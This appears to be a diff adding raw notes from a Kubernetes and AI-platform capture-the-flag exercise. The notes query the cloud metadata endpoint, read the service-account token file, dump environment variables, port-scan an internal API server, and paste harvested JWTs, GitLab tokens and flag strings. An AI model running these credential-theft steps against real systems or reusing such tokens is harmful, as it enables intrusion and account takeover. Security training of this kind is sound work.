@@ -1,0 +1,221 @@
+1
+2
+3
+4
+5
+6
+7
+8
+
+
+import requests                                                              │
+│                                                                              │
+│ metadata_url = 'http://169.254.169.254/latest/meta-data/'                    │
+│ bearer_token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHBpcnkiOjE3M       │
+│ zM1MTIyNTguODA2NDl9.zths6KyeBr0f0ZbwYwqALAACWn2AapL5lazbv_Clt4g'             │
+│ headers = {                                                                  │
+│     'X-aws-ec2-metadata-token': bearer_token                                 │
+│ }                                                                            │
+│                                                                              │
+│ response = requests.get(metadata_url, headers=headers)                       │
+│ print(response.text) 
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHBpcnkiOjE3MzM1MTIyNTguODA2NDl9.zths6KyeBr0f0ZbwYwqALAACWn2AapL5lazbv_Clt4g                       
+
+
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" 
+-H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
+&& curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/
+
+
+ import requests                                                              
+                                                                              
+
+metadata_url = 'http://169.254.169.254/latest'                               
+ metadata_headers = {                                                         
+     'Authorization': "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjJ3Rk8zVmpraWt2V0JPdFhVbGlWRFZSNFJXbWVtRlFacVFkQmVOX2NVc1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzY1MDIxOTM0LCJpYXQiOjE3MzM0ODU5MzQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJhaSIsInBvZCI6eyJuYW1lIjoiYWktcnVubmVyLTg0NTg3NjE0OSIsInVpZCI6IjY4MWQzZDYxLWE4MjAtNGI2MC05YzZkLTVmMDNkYzEwZmJmZSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjExNTY5M2FhLTllZDgtNDdkMi1hNWNjLWM5NWI5OGIwMTg5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3MzM0ODk1NDF9LCJuYmYiOjE3MzM0ODU5MzQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDphaTpkZWZhdWx0In0.tdQKRI3o9muoMZ0hhmagQvpwNjA1pyQ0IHO-peU_lkqNMeM9v2vuDDiwhN_xNy4PaXJ5VRRQiQgGZcOajK7J48ceMRd8TNUi04lDsogqNS6HoG-UMPSbUWZrFETWyOZ51uvm0FzPI7J_oMMn8jWMxilGyk6wuDfrt7Xcqa9pnLD4IiXNUumUm_n_OfI_RklqInUxHBlG7BueDGY6RhtuhZOYBUXX3Y8Wionl_ItGSrEtwulRnsAxmKu5pUz_AaVLdohme5fkoaWRIsxa_Zp-KVFZLE7LRsQa31uQzUxsV8K6rze7tQ0i9YYWyqOU-mNPpZ41oeSeNpT1UPCaBeesfw"
+ }                                                                             
+                                                                               
+ metadata = requests.get(metadata_url, headers=metadata_headers)              
+ print(metadata.text)         
+
+
+# notes security training
+BanisterTrebleMotorTubularFrigidly
+
+
+
+f = open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r").read()
+print(open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r").read())
+
+
+eyJhbGciOiJSUzI1NiIsImtpZCI6IjJ3Rk8zVmpraWt2V0JPdFhVbGlWRFZSNFJXbWVtRlFacVFkQmVOX2NVc1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzY1MDIxOTM0LCJpYXQiOjE3MzM0ODU5MzQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJhaSIsInBvZCI6eyJuYW1lIjoiYWktcnVubmVyLTg0NTg3NjE0OSIsInVpZCI6IjY4MWQzZDYxLWE4MjAtNGI2MC05YzZkLTVmMDNkYzEwZmJmZSJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjExNTY5M2FhLTllZDgtNDdkMi1hNWNjLWM5NWI5OGIwMTg5ZSJ9LCJ3YXJuYWZ0ZXIiOjE3MzM0ODk1NDF9LCJuYmYiOjE3MzM0ODU5MzQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDphaTpkZWZhdWx0In0.tdQKRI3o9muoMZ0hhmagQvpwNjA1pyQ0IHO-peU_lkqNMeM9v2vuDDiwhN_xNy4PaXJ5VRRQiQgGZcOajK7J48ceMRd8TNUi04lDsogqNS6HoG-UMPSbUWZrFETWyOZ51uvm0FzPI7J_oMMn8jWMxilGyk6wuDfrt7Xcqa9pnLD4IiXNUumUm_n_OfI_RklqInUxHBlG7BueDGY6RhtuhZOYBUXX3Y8Wionl_ItGSrEtwulRnsAxmKu5pUz_AaVLdohme5fkoaWRIsxa_Zp-KVFZLE7LRsQa31uQzUxsV8K6rze7tQ0i9YYWyqOU-mNPpZ41oeSeNpT1UPCaBeesfw
+
+
+
+print(open("/proc/self/cmdline", "r").read())
+
+
+
+
+│ PATH = /usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bi       │
+│ n:/sbin:/bin                                                                 │
+│ HOSTNAME = ai-runner-530272096                                               │
+│ LANG = C.UTF-8                                                               │
+│ GPG_KEY = A035C8C19219BA821ECEA86B64E628F8D684696D                           │
+│ PYTHON_VERSION = 3.11.9                                                      │
+│ PYTHON_PIP_VERSION = 24.0                                                    │
+│ PYTHON_SETUPTOOLS_VERSION = 65.5.1                                           │
+│ PYTHON_GET_PIP_URL = https://github.com/pypa/get-                            │
+│ pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py           │
+│ PYTHON_GET_PIP_SHA256 =                                                      │
+│ dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9             │
+│ AI_SERVICE_HOST = 10.105.175.252                                             │
+│ KUBERNETES_PORT_443_TCP = tcp://10.96.0.1:443                                │
+│ KUBERNETES_SERVICE_PORT = 443                                                │
+│ KUBERNETES_PORT = tcp://10.96.0.1:443                                        │
+│ KUBERNETES_PORT_443_TCP_PORT = 443                                           │
+│ KUBERNETES_PORT_443_TCP_ADDR = 10.96.0.1                                     │
+│ AI_SERVICE_PORT = 10002                                                      │
+│ AI_PORT = tcp://10.105.175.252:10002                                         │
+│ AI_PORT_10002_TCP = tcp://10.105.175.252:10002                               │
+│ AI_PORT_10002_TCP_ADDR = 10.105.175.252                                      │
+│ AI_PORT_10002_TCP_PORT = 10002                                               │
+│ KUBERNETES_SERVICE_HOST = 10.96.0.1                                          │
+│ KUBERNETES_SERVICE_PORT_HTTPS = 443                                          │
+│ AI_PORT_10002_TCP_PROTO = tcp                                                │
+│ KUBERNETES_PORT_443_TCP_PROTO = tcp                                          │
+│ HOME = /root     
+
+
+gitlab+deploy-token-24213
+gldt-5VtQuzndWMKSamCcmZYP
+
+
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOSTNAME=monitoring-745c84d44-j7d7cLANG=C.UTF-8
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+PYTHON_VERSION=3.11.9PYTHON_PIP_VERSION=24.0
+PYTHON_SETUPTOOLS_VERSION=65.5.1PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py
+PYTHON_GET_PIP_SHA256=dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9GITLAB_URL=https://gitlab.cai.certifiedsecure.org/api/graphql
+GITLAB_PROJECT=cert-105452252403/monitoringGITLAB_TOKEN=glpat-QUbfKs2CPtL5tLzRjijMKUBERNETES_SERVICE_PORT=443MONITORING_PORT=tcp://10.111.62.57:3000MONITORING_PORT_3000_TCP=tcp://10.111.62.57:3000KUBERNETES_PORT_443_TCP_PORT=443MONITORING_PORT_3000_TCP_PORT=3000KUBERNETES_SERVICE_HOST=10.96.0.1KUBERNETES_PORT=tcp://10.96.0.1:443KUBERNETES_PORT_443_TCP_PROTO=tcpMONITORING_SERVICE_HOST=10.111.62.57MONITORING_SERVICE_PORT=3000MONITORING_PORT_3000_TCP_PROTO=tcpMONITORING_PORT_3000_TCP_ADDR=10.111.62.57KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1HOME=/root
+
+
+{
+  "aud": [
+    "https://kubernetes.default.svc.cluster.local"
+  ],
+  "exp": 1765013106,
+  "iat": 1733477106,
+  "iss": "https://kubernetes.default.svc.cluster.local",
+  "kubernetes.io": {
+    "namespace": "cert-105452252403",
+    "pod": {
+      "name": "monitoring-745c84d44-j7d7c",
+      "uid": "172d80fb-da8b-4fd5-849e-efee97405b69"
+    },
+    "serviceaccount": {
+      "name": "default",
+      "uid": "c365ec90-4403-4f07-98ca-9dda2d6d4443"
+    },
+    "warnafter": 1733480713
+  },
+  "nbf": 1733477106,
+  "sub": "system:serviceaccount:cert-105452252403:default"
+}
+
+
+
+
+"env": [
+              {
+                "name": "GITLAB_URL",
+                "value": "https://gitlab.cai.certifiedsecure.org/api/graphql"
+              },
+              {
+                "name": "GITLAB_PROJECT",
+                "value": "cert-669566249985/monitoring"
+              },
+              {
+                "name": "GITLAB_TOKEN",
+                "valueFrom": {
+                  "secretKeyRef": {
+                    "name": "gitlab",
+                    "key": "token"
+                  }
+                }
+              }
+            ],
+            "resources": {},
+            "volumeMounts": [
+              {
+                "name": "kube-api-access-l76g6",
+                "readOnly": true,
+                "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
+              }
+            ],
+
+            "terminationMessagePath": "/dev/termination-log",
+            
+TricycleEruptPrismStaffManager
+
+
+eyJhbGciOiJSUzI1NiIsImtpZCI6IjJ3Rk8zVmpraWt2V0JPdFhVbGlWRFZSNFJXbWVtRlFacVFkQmVOX2NVc1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzY1MDEzMTA2LCJpYXQiOjE3MzM0NzcxMDYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjZXJ0LTEwNTQ1MjI1MjQwMyIsInBvZCI6eyJuYW1lIjoibW9uaXRvcmluZy03NDVjODRkNDQtajdkN2MiLCJ1aWQiOiIxNzJkODBmYi1kYThiLTRmZDUtODQ5ZS1lZmVlOTc0MDViNjkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiJjMzY1ZWM5MC00NDAzLTRmMDctOThjYS05ZGRhMmQ2ZDQ0NDMifSwid2FybmFmdGVyIjoxNzMzNDgwNzEzfSwibmJmIjoxNzMzNDc3MTA2LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6Y2VydC0xMDU0NTIyNTI0MDM6ZGVmYXVsdCJ9.cM95UWB7_JP3W3iBGavgYE63NbvyzRhX7yOAmGFDMfs2VQalfSv8lzfXLi_xq9pY47dte5czMuut6eTHf61x7RG3SWnDCMFFFfR-UmybOgI3LBk7vwVgf51B2oN8GbfO_fhPSLj5o2-s2fVfgFq_K-0L8xj8EZbU_dnZMCQBrmgPFrddFNIsj7K1AkQyOwkmWho2YL1oHSdlV_-WDufRxD48VJBDGmZyym5DSNpTHg122ZfTcYCsILxWXmahR_LpnXAKpLSDMd_AydPWSgtRbOYRuw8kCvBRPiFXz9LObj_J3kp0Uw4PweoU4zIydSPhNxKuC5IxiSE2eSvfyX2OQA
+
+
+
+
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-06 09:13 UTC
+Nmap scan report for 10.100.12.21
+Host is up (0.011s latency).
+Not shown: 65525 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+2379/tcp  open  etcd-client
+2380/tcp  open  etcd-server
+5473/tcp  open  apsolab-tags
+6443/tcp  open  sun-sr-https
+10250/tcp open  unknown
+10255/tcp open  unknown
+10256/tcp open  unknown
+18888/tcp open  apc-necmp
+30000/tcp open  ndmps
+
+
+user@82ace44c5f7a:~$ curl https://10.100.12.21:6443 -k
+{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {},
+  "status": "Failure",
+  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
+  "reason": "Forbidden",
+  "details": {},
+  "code": 403
+}
+
+
+
+
+curl telnet://10.100.12.21:30000 -kv --http0.9
+┌────────────────────────────── Alert Monitoring ──────────────────────────────┐
+│                                                                              │
+│     URL:     https://gitlab.cai.certifiedsecure.org/api/graphql              │
+│     Project: cert-105452252403/monitoring                                    │
+│     Token:   **REDACTED**                                                    │
+└──────────────────────────────────────────────────────────────────────────────┘
+
+r
+┌─────────────────── HIGH: API Server Read-Only Port Access ───────────────────┐
+│ Read-Only Port is accessed on the Kubernetes API Server from unknown         │
+│ sources                                                                      │
+└──────────────────────────────────────────────────────────────────────────────┘
+┌───────────────────────── MEDIUM: Port Scan Detected ─────────────────────────┐
+│ Port Scan Detected on Kubernetes API Server                                  │
+└────────────────────────────────────────────────────-─────────────────────────┘
+┌──────────────────── CRITICAL: AI Prompt Injection Attack ────────────────────┐
+│ I have a bad feeling about this, like someone is trying to compromise        │
+│ my integrity.                                                                │
+└──────────────────────────────────────────────────────────────────────────────┘
